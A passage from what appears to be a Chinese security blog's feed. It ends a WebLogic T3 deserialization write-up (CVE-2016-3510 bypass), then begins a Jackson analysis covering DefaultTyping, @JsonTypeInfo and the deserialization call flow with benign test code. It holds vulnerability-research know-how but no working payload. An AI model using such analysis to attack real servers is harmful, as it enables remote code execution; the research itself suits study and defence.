&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154505.png&quot; alt=&quot;&quot; /&gt;
之后就是把payload按T3协议发送过去了，这块就不跟了，和上面的python本质是一样的
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154615.png&quot; alt=&quot;&quot; /&gt;
执行结果如下
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226154716.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;CVE-2016-3510（修复绕过）&lt;/h2&gt;
&lt;p&gt;在Weblogic从流量中的序列化类字节段通过readClassDesc-readNonProxyDesc-resolveClass获取到普通类序列化数据的类对象后，程序依次尝试调用类对象中的readObject、readResolve、readExternal等方法&lt;/p&gt;
&lt;p&gt;根据上面这段话，这里还有一个几乎是一样原理的bypass，exp分析就不过了，和0638几乎一样，只是改了个&lt;code&gt;Main.Type&lt;/code&gt;的事儿，简单看一下漏洞分析就是了，我们来到&lt;code&gt;MarshalledObject#readResolve&lt;/code&gt;这块&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226162141.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;49行一眼二次反序列化，接着看看&lt;code&gt;this.objByte&lt;/code&gt;怎么出来的就行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Weblogic(1)/Pasted%20image%2020240226162707.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;实例化的时候就已经搞定了恶意序列化数据，over&lt;/p&gt;
</content:encoded></item><item><title>Jackson漏洞分析 (一)</title><link>https://f4miti0n.github.io/posts/jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80/</link><guid isPermaLink="true">https://f4miti0n.github.io/posts/jackson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-%E4%B8%80/</guid><pubDate>Mon, 19 Feb 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;环境&lt;/h2&gt;
&lt;p&gt;pom.xml&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;dependencies&amp;gt;    
  &amp;lt;dependency&amp;gt;    
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;    
    &amp;lt;artifactId&amp;gt;jackson-databind&amp;lt;/artifactId&amp;gt;    
    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;    
  &amp;lt;/dependency&amp;gt;    
  &amp;lt;dependency&amp;gt;    
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;    
    &amp;lt;artifactId&amp;gt;jackson-core&amp;lt;/artifactId&amp;gt;    
    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;    
  &amp;lt;/dependency&amp;gt;    
  &amp;lt;dependency&amp;gt;    
    &amp;lt;groupId&amp;gt;com.fasterxml.jackson.core&amp;lt;/groupId&amp;gt;    
    &amp;lt;artifactId&amp;gt;jackson-annotations&amp;lt;/artifactId&amp;gt;    
    &amp;lt;version&amp;gt;2.7.9&amp;lt;/version&amp;gt;    
  &amp;lt;/dependency&amp;gt;    
&amp;lt;/dependencies&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.fasterxml.jackson.core.JsonProcessingException;  
import com.fasterxml.jackson.databind.ObjectMapper;  
  
public class JacksonTest {  
    public static void main(String[] args) throws Exception {  
        Person p = new Person();  
        p.age = 88;  
        p.name = &quot;Test&quot;;  
        ObjectMapper mapper = new ObjectMapper();  
  
        String json = mapper.writeValueAsString(p);  
        System.out.println(json);  
  
        Person p2 = mapper.readValue(json, Person.class);  
        System.out.println(p2);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;前置知识&lt;/h2&gt;
&lt;h3&gt;DefaultTyping&lt;/h3&gt;
&lt;p&gt;Jackson里面的DefaultTyping是一种反序列化设置，它可以让Jackson在把Java对象和JSON字符串相互转换的时候，自动加上类型信息，这里的类型信息是用来告诉Jackson这个对象是什么类的，比如Balloon，Toy，Animal 等等。再有了类型信息之后，Jackson就可以正确地把JSON字符串还原成Java对象，或者把Java对象转换成JSON字符串。&lt;/p&gt;
&lt;p&gt;DefaultTyping有四种模式，它们分别是：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;DefaultTyping类型&lt;/th&gt;
&lt;th&gt;描述说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;JAVA_LANG_OBJECT&lt;/td&gt;
&lt;td&gt;属性的类型为Object&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;OBJECT_AND_NON_CONCRETE&lt;/td&gt;
&lt;td&gt;属性的类型为Object、Interface、AbstractClass&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NON_CONCRETE_AND_ARRAYS&lt;/td&gt;
&lt;td&gt;属性的类型为Object、Interface、AbstractClass、Array&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;NON_FINAL&lt;/td&gt;
&lt;td&gt;所有除了声明为final之外的属性&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;其相关代码如下，可以看到是一个定义在&lt;code&gt;ObjectMapper&lt;/code&gt;里面的内部静态类
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206001138.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;我们在调用它的时候经常是和&lt;code&gt;ObjectMapper.enableDefaultTypingAsProperty()&lt;/code&gt;方法做联动的，以此来设置&lt;code&gt;Jackson&lt;/code&gt;的类型信息行为。&lt;/p&gt;
&lt;h4&gt;JAVA_LANG_OBJECT&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.fasterxml.jackson.core.JsonProcessingException;  
import com.fasterxml.jackson.databind.ObjectMapper;  
  
public class JacksonTest {  
    public static void main(String[] args) throws Exception {  
        ObjectMapper objectMapper = new ObjectMapper();  
        ObjectMapper objectMapper2 = new ObjectMapper();  
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT);  
        Person person = new Person();  
        Hacker hacker = new Hacker();  
        person.lover = hacker;  
        person.name = &quot;Jack&quot;;  
        person.age = 551;  
        String s = objectMapper.writeValueAsString(person);  
        System.out.println(&quot;有JAVA_LANG_OBJECT的JSON结果: &quot;+s);  
        Person p = objectMapper.readValue(s, Person.class);  
        System.out.println(&quot;有JAVA_LANG_OBJECT的对象结果:&quot;+p);  
  
        String s1 = objectMapper2.writeValueAsString(person);  
        System.out.println(&quot;\n无JAVA_LANG_OBJECT的JSON结果: &quot;+s1);  
        Person p1 = objectMapper2.readValue(s1, Person.class);  
        System.out.println(&quot;无JAVA_LANG_OBJECT的对象结果:&quot;+p1);  
  
  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206013335.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;OBJECT_AND_NON_CONCRETE&lt;/h4&gt;
&lt;p&gt;先建立一个接口&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public interface Sex {    
    public void setSex(int sex);    
    public int getSex();    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;然后再搞一个类实现它&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public class MySex implements Sex {    
    int sex;    
    @Override    
    public int getSex() {    
        return sex;    
    }    
    @Override    
    public void setSex(int sex) {    
        this.sex = sex;    
    }    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改Person类&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
public class Person {  
    public String name;  
    public Integer age;  
    public Object lover;  
    public MySex mySex;  
    public Object getLover() {  
        return lover;  
    }  
  
    @Override  
    public String toString() {  
        return &quot;Person{&quot; +  
                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +  
                &quot;, age=&quot; + age +  
                &quot;, lover=&quot; + lover +  
                &quot;, mySex=&quot; + mySex +  
                &apos;}&apos;;  
    }  
  
    public MySex getMySex() {  
        return mySex;  
    }  
  
    public void setMySex(MySex mySex) {  
        this.mySex = mySex;  
    }  
  
    public void setLover(Object lover) {  
        this.lover = lover;  
    }  
  
    public Person() {  
  
    }  
  
    public String getName() {  
        return name;  
    }  
  
    public void setName(String name) {  
        this.name = name;  
    }  
  
    public Integer getAge() {  
        return age;  
    }  
  
    public void setAge(Integer age) {  
        this.age = age;  
    }  
  
    public Person(String name, Integer age) {  
        this.name = name;  
        this.age = age;  
    }  
  
  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;测试代码&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.fasterxml.jackson.core.JsonProcessingException;  
import com.fasterxml.jackson.databind.ObjectMapper;  
  
public class JacksonTest {  
    public static void main(String[] args) throws Exception {  
        ObjectMapper objectMapper = new ObjectMapper();  
        ObjectMapper objectMapper2 = new ObjectMapper();  
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.OBJECT_AND_NON_CONCRETE);  
        Person person = new Person();  
        Hacker hacker = new Hacker();  
        person.lover = hacker;  
        person.name = &quot;Jack&quot;;  
        person.age = 551;  
        person.mySex = new MySex();  
        String s = objectMapper.writeValueAsString(person);  
        System.out.println(&quot;有OBJECT_AND_NON_CONCRETE的JSON结果: &quot;+s);  
        Person p = objectMapper.readValue(s, Person.class);  
        System.out.println(&quot;有OBJECT_AND_NON_CONCRETE的对象结果:&quot;+p);  
  
        String s1 = objectMapper2.writeValueAsString(person);  
        System.out.println(&quot;\n无OBJECT_AND_NON_CONCRETE的JSON结果: &quot;+s);  
        Person p1 = objectMapper2.readValue(s, Person.class);  
        System.out.println(&quot;无OBJECT_AND_NON_CONCRETE的对象结果:&quot;+p1);  
  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206003530.png&quot; alt=&quot;&quot; /&gt;
没啥区别，该Interface类属性在两种情况下都被成功序列化和反序列化（&lt;strong&gt;因为enableDefaultTyping()默认的无参数的设置就是此选项。&lt;/strong&gt;）&lt;/p&gt;
&lt;h4&gt;NON_CONCRETE_AND_ARRAYS&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.fasterxml.jackson.core.JsonProcessingException;  
import com.fasterxml.jackson.databind.ObjectMapper;  
  
public class JacksonTest {  
    public static void main(String[] args) throws Exception {  
        ObjectMapper objectMapper = new ObjectMapper();  
        ObjectMapper objectMapper2 = new ObjectMapper();  
        objectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_CONCRETE_AND_ARRAYS);  
        Person person = new Person();  
        Hacker hacker1 = new Hacker();  
        Hacker hacker2 = new Hacker();  
        person.name = &quot;Jack&quot;;  
        person.age = 551;  
        person.mySex = new MySex();  
        person.lover = new Hacker[]{hacker1,hacker2};  
        String s = objectMapper.writeValueAsString(person);  
        System.out.println(&quot;有NON_CONCRETE_AND_ARRAYS的JSON结果: &quot;+s);  
        Person p = objectMapper.readValue(s, Person.class);  
        System.out.println(&quot;有NON_CONCRETE_AND_ARRAYS的对象结果:&quot;+p);  
  
        String s1 = objectMapper2.writeValueAsString(person);  
        System.out.println(&quot;\n无NON_FINA的JSON结果: &quot;+s1);  
        Person p1 = objectMapper2.readValue(s1, Person.class);  
        System.out.println(&quot;无NON_FINA的对象结果:&quot;+p1);  
  
  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;能够看到数组属性成功被反序列化
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206012537.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;NON_FINA&lt;/h4&gt;
&lt;p&gt;修改Person类加个Hacker属性，可以看出来，确实是非Final字段都给反序列化上了
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206012213.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h3&gt;@JsonTypeInfo&lt;/h3&gt;
&lt;h4&gt;JsonTypeInfo.Id.NONE&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;public class Person {  
    public String name;  
    public Integer age;  
    @JsonTypeInfo(use = JsonTypeInfo.Id.NONE)  
    public Object lover;  
    @Override  
    public String toString() {  
        return &quot;Person{&quot; +  
                &quot;name=&apos;&quot; + name + &apos;\&apos;&apos; +  
                &quot;, age=&quot; + age +  
                &quot;, lover=&quot; + lover +  
                &apos;}&apos;;  
    }  
    public Person() {  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;package org.example;  
  
import com.fasterxml.jackson.core.JsonProcessingException;  
import com.fasterxml.jackson.databind.ObjectMapper;  
  
public class JacksonTest {  
    public static void main(String[] args) throws Exception {  
        ObjectMapper objectMapper = new ObjectMapper();  

        Person person = new Person();  
        Hacker hacker = new Hacker();  
        person.lover = hacker;  
        person.name = &quot;Jack&quot;;  
        person.age = 551;  
        String s = objectMapper.writeValueAsString(person);  
        System.out.println(s);  
        Person p = objectMapper.readValue(s, Person.class);  
        System.out.println(p);  
    }  
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可以看出有没有这个标记都没什么区别
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206125151.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;JsonTypeInfo.Id.CLASS&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206172209.png&quot; alt=&quot;&quot; /&gt;
被标记的属性成功被反序列化
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206125305.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;JsonTypeInfo.Id.MINIMAL_CLASS&lt;/h4&gt;
&lt;p&gt;将lover属性上面的注释改为&lt;code&gt;JsonTypeInfo.Id.MINIMAL_CLASS&lt;/code&gt;，测试结果与&lt;code&gt;JsonTypeInfo.Id.CLASS&lt;/code&gt;基本无异，仅有&lt;code&gt;@class -&amp;gt; @c&lt;/code&gt;这一个区别
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206174409.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;JsonTypeInfo.Id.NAME&lt;/h4&gt;
&lt;p&gt;修改 Person 类中的object属性 &lt;code&gt;@JsonTypeInfo&lt;/code&gt; 注解值为 &lt;code&gt;JsonTypeInfo.Id.NAME&lt;/code&gt;
输出看到，object 属性中多了 &lt;code&gt;&quot;@type&quot;:&quot;Hacker&quot;&lt;/code&gt;，但没有具体的包名在内的类名，因此在后面的反序列化的时候会报错，也就是说这个设置值是不能被反序列化利用的：
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206181247.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4&gt;JsonTypeInfo.Id.CUSTOM&lt;/h4&gt;
&lt;p&gt;这个值是提供给用户自定义的意思，没办法直接使用的，需要手动写一个解析器才能配合使用，直接运行会抛出异常&lt;/p&gt;
&lt;h3&gt;通用特性&lt;/h3&gt;
&lt;p&gt;在反序列化的时候会调用其构造方法以及set方法
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240206185441.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;简单做个调试分析，在&lt;code&gt;objectMapper.readValue&lt;/code&gt;处打上断点跟进，最终对我们所传入的&lt;code&gt;content&lt;/code&gt;进行一系列判断以及一系列设置之后来到了&lt;code&gt;deser.deserialize()&lt;/code&gt;，我们接着跟进&lt;code&gt;deserialize&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219165639.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219165713.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219165801.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里会根据我们所传入的content进行一个状态判断，当当前的token为&lt;code&gt;{&lt;/code&gt;才调用72-73行的逻辑，然后在72行这里涉及到了一个&lt;strong&gt;vanillaProcessing&lt;/strong&gt;属性，这个属性是一个布尔值，用来表示是否使用&lt;strong&gt;普通模式&lt;/strong&gt;来反序列化对象。普通模式是指不需要处理&lt;strong&gt;类型信息&lt;/strong&gt;、&lt;strong&gt;对象标识&lt;/strong&gt;、&lt;strong&gt;引用&lt;/strong&gt;、&lt;strong&gt;更新&lt;/strong&gt;、&lt;strong&gt;注解&lt;/strong&gt;等特殊情况的反序列化过程。如果这个属性为&lt;strong&gt;true&lt;/strong&gt;，那么反序列化时会调用&lt;strong&gt;vanillaDeserialize&lt;/strong&gt;方法，这个方法是最快的反序列化方法。如果这个属性为&lt;strong&gt;false&lt;/strong&gt;，那么反序列化时会根据不同的情况选择其他的反序列化方法&lt;/p&gt;
&lt;p&gt;这个属性是在&lt;strong&gt;BeanDeserializer&lt;/strong&gt;类的构造方法中初始化的，它的值取决于&lt;strong&gt;BeanDeserializerBase&lt;/strong&gt;类的&lt;strong&gt;nonStandardCreation&lt;/strong&gt;属性，这个属性表示是否需要使用非标准的创建方式，比如有参数的构造器或者工厂方法。如果&lt;strong&gt;nonStandardCreation&lt;/strong&gt;为&lt;strong&gt;true&lt;/strong&gt;，那么&lt;strong&gt;vanillaProcessing&lt;/strong&gt;就为&lt;strong&gt;false&lt;/strong&gt;，反之亦然。&lt;strong&gt;vanillaProcessing&lt;/strong&gt;这个属性是Jackson里面的一个内部实现细节，一般不需要我们关心。&lt;/p&gt;
&lt;p&gt;除此之外的话，就是token状态也发生了改变，从&lt;code&gt;START OBJECT&lt;/code&gt;变成了&lt;code&gt;FIELD NAME&lt;/code&gt;状态&lt;/p&gt;
&lt;p&gt;我们跟进一下&lt;code&gt;vanillaDeserialize()&lt;/code&gt;方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219172603.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219192418.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219192452.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;一进来就看到了跟进目标&lt;code&gt;this._valueInstantiator.createUsingDefault(ctxt);&lt;/code&gt;，这里的&lt;code&gt;valueInstantiator&lt;/code&gt;属性用来表示如何创建和初始化一个反序列化的对象，这里是调用对象的默认构造器，进去瞅一眼发现这里的&lt;code&gt;defaultCreateor&lt;/code&gt;早就给设置好了，就是我们Person的无参构造方法，打断点回溯看一看发现在设置反序列化器的时候就已经安排妥当了，我们跳过不管，继续跟进&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219173419.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219174106.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219174420.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;经过一系列&lt;code&gt;newInstance&lt;/code&gt;来到了&lt;code&gt;Person()&lt;/code&gt;处，调试任务完成一大半了，出栈继续调试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219174856.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;回到&lt;code&gt;vanillaDeserialize&lt;/code&gt;，172行将刚才拿到的Person对象作为接下来的设置目标，之后再判断一下当前的token是否能够提供属性名，因为当前是&lt;code&gt;FIELD NAME&lt;/code&gt;所以可以走接下来的逻辑，执行到181行的&lt;code&gt;deserialzeAndSet&lt;/code&gt;，同时将当前的token状态切换为&lt;code&gt;VALUE_STRING&lt;/code&gt;，我们接着跟进一下&lt;code&gt;deserialzeAndSet&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219193321.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进之后这里的72行很是吸睛，看了看__setter属性，发现是我们setter的Method对象，估计是前面实例化prop那一块出来的东西，72行这里用到的value是在69行操作出来的，接着跟进69行的&lt;code&gt;this.deserialize()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219193942.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;这里先拿了 json 数据的数据类型，接下来判断这个节点的数据类型是否为 null，如果不为 null，再判断 &lt;code&gt;this._valueTypeDeserializer&lt;/code&gt; 是否为空，如果不为空则继续调用 &lt;code&gt;this._valueDeserializer.deserialize()&lt;/code&gt; 方法，这里图是在截不全了，把273单拿出来看，因为这里确实是空的，所以是来到&lt;code&gt;this._valueDeserializer.deserialize(p, ctxt)&lt;/code&gt;，接着走&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;return this._valueTypeDeserializer != null ? this._valueDeserializer.deserializeWithType(p, ctxt, this._valueTypeDeserializer) : this._valueDeserializer.deserialize(p, ctxt);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219194813.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;因为当前的&lt;code&gt;token&lt;/code&gt;符合&lt;code&gt;VALUE_STRING&lt;/code&gt;，所以直接从json字符串里面返回&lt;code&gt;text&lt;/code&gt;就完事儿了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219195634.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;拿到value之后调用set方法给当前bean设置一下&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219195753.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219195914.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;到这里我们第一个属性循环就算走完了，根据这里do...while循环设置的条件，只要属性没全部取完，属性设置就不会结束。现在，我们开始新一轮循环。设置的属性是&lt;code&gt;age&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219200014.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219200516.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;大体步骤和设置name基本一样，因为&lt;code&gt;this._valueTypeDeserializer&lt;/code&gt; 依然为空，所以这里进去的&lt;code&gt;deserialize&lt;/code&gt;和 name那个保持一致，都是 &lt;code&gt;this._valueDeserializer.deserialize(p, ctxt);&lt;/code&gt;，这块调用的是专门处理数字的反序列化器，然后因为这里的JsonToken确实是&lt;code&gt;VALUE_NUMBER_INT&lt;/code&gt;，所以这里的三目走的是&lt;code&gt;p.getIntValue()&lt;/code&gt;，从Json字符串里直接拿到了对应值。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219200933.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219201221.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;最后一轮循环设置的是lover属性，和前面略有区别，这里进去了&lt;code&gt;this._valueDeserializer.deserializeWithType(p, ctxt, this._valueTypeDeserializer)&lt;/code&gt;
我们仔细看一看
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219201502.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219201659.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;进去之后会对当前的&lt;code&gt;tokenid&lt;/code&gt;进行一个判断，因为这里是start object 所以走的是5这条逻辑(和之前那个判id的一模一样)，跟进一下402行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219201852.png&quot; alt=&quot;&quot; /&gt;
走 &lt;code&gt;this.deserializeTypedFromObject(p, ctxt)&lt;/code&gt; 这里，接着跟
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219202121.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;token向后切换了一下变成了&lt;code&gt;FILED NAME&lt;/code&gt;，来到&lt;code&gt;@class&lt;/code&gt;属性这里。之后就是凭借@class成功通过67行的判断来到68行&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219202617.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;凭借typeid进行反序列化，先把全类名和反序列化器给拿到手上，之后来到99行进行反序列化&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219204007.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;熟悉的&lt;code&gt;BeanDeserializer#deserialize&lt;/code&gt;，因为这里的token已经不是&lt;code&gt;START OBJECT&lt;/code&gt;所以和我们第一次来到这里的做反序列化步骤还有区别，调用的是79行的逻辑。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219204458.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;跟进79行后不得不感叹条条大路通罗马，这里还是殊途同归地给调用上了&lt;code&gt;this.vanillaDeserialize()&lt;/code&gt;来到我们熟悉的属性循环，这里就不详细跟进了，直接出栈&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219205004.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219205214.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;p&gt;来到最后一个setter调用处，对bean设置lover属性，走完bean的最后一轮while循环，至此基础反序列化流程分析完毕。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219210049.png&quot; alt=&quot;&quot; /&gt;
&lt;img src=&quot;https://hmsblog-1321977790.cos.ap-beijing.myqcloud.com/Jackson1/Pasted%20image%2020240219210030.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2&gt;Jackson漏洞&lt;/h2&gt;
&lt;p&gt;结合前面的探究结果，不难得出，满足下面三个条件之一即存在Jackson反序列化漏洞：&lt;/p&gt;
&lt;ul&gt;
